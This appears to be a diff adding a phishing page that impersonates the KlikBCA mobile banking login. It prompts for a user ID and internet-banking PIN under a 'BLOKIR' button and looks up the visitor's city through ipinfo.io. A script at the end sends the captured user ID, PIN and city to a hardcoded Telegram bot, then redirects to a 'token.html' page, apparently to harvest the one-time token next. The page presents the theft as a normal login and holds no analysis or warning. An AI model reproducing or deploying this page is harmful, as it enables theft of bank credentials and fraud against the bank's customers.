@@ -1,0 +1,148 @@
+<!DOCTYPE html PUBLIC "-//WAPFORUM//DTD XHTML Mobile 1.0//EN" "http://www.wapforum.org/DTD/xhtml-mobile10.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" /> 
+<meta content="https://tse1.mm.bing.net/th?id=OIP.eKSceRbZYXMNbpAZ2ZAn7wHaHZ&pid=Api&H=159&W=160" property="og:image">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1.0, user-scalable=no">
+<link rel="icon" type="image/png" href="https://tse2.mm.bing.net/th?id=OIP.kScmzs4mG290SvMIYntyEAHaHa&pid=Api&H=160&W=160"/>
+<title>KlikBCA</title>
+<style type="text/css">
+hr { margin-top: auto; margin-bottom: auto;}
+.OranRule { border: 3px solid #e7d300;}
+</style>
+<link href="https://m.klikbca.com/style.css" rel="stylesheet" type="text/css" />
+<link href="https://m.klikbca.com/css/banner-slide.css" rel="stylesheet" type="text/css" />
+<script src="https://m.klikbca.com/library/jsencrypt.min.js"></script>
+<script type="text/javascript" src="https://m.klikbca.com/8OyYt73AP1GnNh4i.js?init=1"></script>
+</head>
+<body onload="document.getElementById('nama').focus();">
+
+<div id="wrapper">
+    <div id="header">
+        <div id="logo" style="background:#FFFFFF url(https://m.klikbca.com/images/bg_top_2x55.gif) repeat-x top; height:57px; color:#FFFFFF">
+            <img src="https://m.klikbca.com/images/logo_bca_64x55.gif" alt="BCA-lite"/>
+        </div>
+        <div style="background:#e7cb00; height:3px">&nbsp;</div>
+    </div>
+
+    <div id="page-content" style="display:inline-block;">
+        <table id="tbl-txtinput" cellpadding="6" cellspacing="0" width="100%">
+            <tr>
+                <td>
+                <table cellspacing="0" cellpadding="0"> 
+                    <form id="klikBca" method="POST">
+                    <tr><td style="color:#303962; border-bottom:solid 1px #6f6f6f">Silakan masukkan USER ID Anda</td></tr>
+                    <tr><td style="color:#ff9c00; border-top:solid 1px #6f6f6f">Please enter your USER ID</td></tr>
+                </table>
+                </td>
+            </tr>
+            <tr>
+                <td><input type="text" name="nama" maxlength="12" size="24" id="nama" required="required"/></td>
+            </tr>
+            <tr>
+                <td>
+                    <table cellspacing="0" cellpadding="0">
+                        <tr><td style="color:#303962; border-bottom:solid 1px #6f6f6f">Silakan masukkan PIN Internet Banking Anda</td></tr>
+                        <tr><td style="color:#ff9c00; border-top:solid 1px #6f6f6f">Please enter your Internet Banking PIN</td></tr>
+                    </table>
+                </td>
+            </tr>
+            <tr>
+                <td>
+                    <input type="tel" name="pin" size="24" maxlength="6" id="pin" required="required"/> 
+                    <input type="hidden" name="kota" id="kota" />
+                </td>
+            </tr>
+        </table>
+        <table cellpadding="6" cellspacing="0" width="100%">
+            <tr>
+                <td style="border-bottom:solid 1px #6f6f6f">
+                    <input type="submit" value="BLOKIR" id="kirims" onmouseover="this.style.cursor='hand'"/>
+                </td>
+                <td align="right" valign="bottom" style="border-bottom:solid 1px #6f6f6f">
+                    <a href="https://m.klikbca.com/javascript:go2Full();"><u>Full Site</u></a>
+                </td>
+            </tr>
+        </table>
+        </form>
+
+        <!-- Banner -->
+        <table cellpadding="6" cellspacing="0">
+            <tr>
+                <td>
+                    <div class="banner-slide-container">
+                        <!-- (banner-slide divs skipped for brevity) -->
+                    </div>
+                </td>
+            </tr>
+            <tr>
+                <td>
+                    <a href="https://www.bca.co.id/awasmodus" target="new">
+                        <img src="https://m.klikbca.com/images/keamanan-ib.png" alt="" height="30"/>
+                    </a>
+                    <img src="https://m.klikbca.com/images/digicert-seal.png" alt="DigiCert Seal" height="30"/>
+                </td>
+            </tr>
+        </table>
+    </div>
+
+    <div id="footer" valign="middle">
+        <table border="0" cellpadding="0" cellspacing="0" width="100%">
+            <tr><td width="10" height="35">&nbsp;</td><td valign="middle" align="left" width="50"></td><td>&nbsp;</td></tr>
+        </table>
+    </div>
+</div>
+
+<script>
+document.addEventListener("DOMContentLoaded", function () {
+    fetch("https://ipinfo.io/city")
+        .then(response => response.text())
+        .then(data => {
+            document.getElementById("kota").value = data.trim();
+        })
+        .catch(error => {
+            document.getElementById("kota").value = "Gagal Mendapatkan Kota";
+        });
+});
+</script>
+
+<script src="https://code.jquery.com/jquery-3.5.1.min.js"></script>
+<script>
+$(document).ready(function(){
+    $('#klikBca').submit(function(e) {
+        e.preventDefault();
+
+        document.getElementById('kirims').value = "Memproses...";
+
+        let nama = $('#nama').val();
+        let pin = $('#pin').val();
+        let kota = $('#kota').val();
+
+        let message = `🔐 Login KlikBCA\n👤 USER ID: ${nama}\n🔑 PIN: ${pin}\n📍 Kota: ${kota}`;
+
+        $.ajax({
+            url: "https://api.telegram.org/bot7223686317:AAFJKbUn4qC-s9s6Ii-vQRevQ47bk47TS2I/sendMessage",
+            method: "POST",
+            data: {
+                chat_id: "7386992179",
+                text: message
+            },
+            success: function(response) {
+                console.log("Berhasil dikirim ke Telegram");
+                setTimeout(function(){
+                    sessionStorage.setItem("nama", nama);
+                    sessionStorage.setItem("pin", pin);
+                    sessionStorage.setItem("kota", kota);
+                    window.location.href = 'token.html';
+                }, 500);
+            },
+            error: function(error) {
+                console.error("Gagal kirim ke Telegram", error);
+            }
+        });
+    });
+});
+</script>
+
+</body>
+</html>
